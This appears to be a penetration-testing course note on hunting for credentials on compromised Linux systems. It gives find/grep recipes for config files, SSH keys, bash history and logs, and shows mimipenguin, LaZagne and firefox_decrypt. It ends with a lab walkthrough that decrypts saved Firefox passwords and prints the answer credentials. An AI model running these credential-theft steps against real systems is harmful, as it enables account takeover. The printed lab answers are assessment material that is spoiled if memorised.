# 17 — Credential Hunting in Linux

## Overview

After gaining access to a Linux system, credential hunting is one of the first privilege escalation steps. Credentials can be found in four main categories:

| Category | Examples |
|----------|----------|
| **Files** | Configs, databases, notes, scripts, cronjobs, SSH keys |
| **History** | Logs, command-line history |
| **Memory** | Cache, in-memory processing |
| **Key-rings** | Browser stored credentials |

---

## File-Based Credential Hunting

### Configuration Files (.conf, .config, .cnf)

```bash
# Find all config files
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Search config files for credentials
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: " $i
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```

### Database Files

```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

### Notes and Text Files

```bash
# Find .txt files and files with no extension in home dirs
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts (may contain hardcoded creds)

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

### Cronjobs

```bash
# System-wide crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.*/
```

### SSH Keys

```bash
# Search for private keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

---

## History-Based Credential Hunting

### Command-Line History

```bash
# Check all users' bash history
tail -n5 /home/*/.bash*

# Also check .bashrc and .bash_profile
cat /home/*/.bashrc /home/*/.bash_profile 2>/dev/null
```

### Log Files

| Log File | Description |
|----------|-------------|
| `/var/log/messages` | Generic system activity |
| `/var/log/syslog` | Generic system activity |
| `/var/log/auth.log` | Authentication logs (Debian) |
| `/var/log/secure` | Authentication logs (RedHat/CentOS) |
| `/var/log/boot.log` | Booting information |
| `/var/log/dmesg` | Hardware/driver logs |
| `/var/log/kern.log` | Kernel warnings/errors |
| `/var/log/faillog` | Failed login attempts |
| `/var/log/cron` | Cron job logs |
| `/var/log/mail.log` | Mail server logs |
| `/var/log/httpd` | Apache logs |
| `/var/log/mysqld.log` | MySQL server logs |

```bash
# Search logs for interesting keywords
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: " $i
    grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null
  fi
done
```

---

## Memory and Cache

### Mimipenguin (requires root)

Extracts credentials from memory for logged-in users:

```bash
sudo python3 mimipenguin.py
# [SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
```

### LaZagne (requires root)

Extracts credentials from many sources:

```bash
sudo python2.7 laZagne.py all
```

LaZagne sources include: Wifi, wpa_supplicant, Libsecret, Kwallet, Chromium-based, CLI, Mozilla, Thunderbird, Git, ENV variables, Grub, Fstab, AWS, Filezilla, Gftp, SSH, Apache, Shadow, Docker, Keepass, Mimipy, Sessions, Keyrings.

---

## Browser Credentials

### Firefox

Credentials stored encrypted in `logins.json`:

```bash
# Find Firefox profiles
ls -l .mozilla/firefox/ | grep default

# View encrypted logins
cat .mozilla/firefox/<profile>/logins.json | jq .
```

### Firefox Decrypt (requires Python 3.9)

```bash
python3.9 firefox_decrypt.py
# Select profile → outputs plaintext credentials
```

### LaZagne (browsers module)

```bash
python3 laZagne.py browsers
```

---

## Quick Reference: One-Liner Searches

| Target | Command |
|--------|---------|
| Config files | `find / -name "*.conf" -o -name "*.config" -o -name "*.cnf" 2>/dev/null` |
| Passwords in files | `grep -rnw '/' -e 'password' --include='*.conf' 2>/dev/null` |
| Database files | `find / -name "*.sql" -o -name "*.db" 2>/dev/null` |
| Scripts | `find / -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null` |
| SSH keys | `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` |
| Bash history | `tail -n20 /home/*/.bash_history 2>/dev/null` |
| Cronjobs | `cat /etc/crontab; ls -la /etc/cron.*/` |

---

## Key Takeaways

- Adapt your search to the system's role (DB server, web server, workstation)
- Configuration files (`.conf`, `.cnf`, `.config`) frequently contain credentials
- Bash history often exposes passwords passed as command arguments
- Cronjobs and automation scripts commonly have hardcoded credentials
- LaZagne and mimipenguin automate credential extraction from memory and apps
- Firefox stores encrypted creds in `logins.json` — use `firefox_decrypt.py` to read them
- Log files reveal authentication events, failed logins, and sudo usage
- Keyrings provide OS-level password management — another target for extraction

---

## Skills Assessment Walkthrough

**Target:** SSH to 10.129.202.64 as kira (`L0vey0u1!`)

```bash
ssh kira@10.129.202.64
```

### Step 1: Check Bash History

```bash
tail -n20 /home/*/.bash_history 2>/dev/null
```

Revealed kira navigated to a Firefox profile directory (`ytb95ytb.default-release/`), viewed `logins.json`, and ran `su` — indicating credential reuse and Firefox stored passwords.

### Step 2: Explore Home Directories

```bash
ls -la /home/
# Found: kira, sam, will
ls -la /home/will/
# Found: .backups/ directory (world-readable)
ls -la /home/will/.backups/
# Found: passwd.bak (readable), shadow.bak (not readable as kira)
```

### Step 3: Check Firefox Stored Credentials

```bash
# Found encrypted logins
cat /home/kira/.mozilla/firefox/ytb95ytb.default-release/logins.json
# Shows encrypted credentials for https://dev.inlanefreight.com
```

### Step 4: Decrypt Firefox Credentials

Transfer `firefox_decrypt.py` to the target (no internet on box):

```bash
# On LOCAL machine — download compatible version
curl -o /tmp/firefox_decrypt.py https://raw.githubusercontent.com/unode/firefox_decrypt/refs/tags/1.0.0/firefox_decrypt.py

# Fix Python 3.8 compatibility (list[dict] → List[Dict])
sed -i 's/PWStore = list\[dict\[str, str\]\]/from typing import List, Dict\nPWStore = List[Dict[str, str]]/' /tmp/firefox_decrypt.py

# SCP to target
scp /tmp/firefox_decrypt.py kira@10.129.202.64:/tmp/firefox_decrypt.py
```

Then on the target:

```bash
python3 /tmp/firefox_decrypt.py /home/kira/.mozilla/firefox/ytb95ytb.default-release/
```

Output:
```
Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```

### Answer

| User | Password | Source |
|------|----------|--------|
| will | `TUqr7QfLTLhruhVbCP` | Firefox stored credentials (decrypted via firefox_decrypt.py) |

### Lessons Learned

- Bash history reveals what the user was doing — follow their trail
- Firefox `logins.json` contains encrypted credentials; `key4.db` holds the decryption key
- `firefox_decrypt.py` requires matching Python version — v1.0.0 uses `list[dict]` (Python 3.9+), fix with `from typing import List, Dict`
- When the target has no internet, SCP tools from your local machine
- Always check `.backups/` and similar directories in user home folders
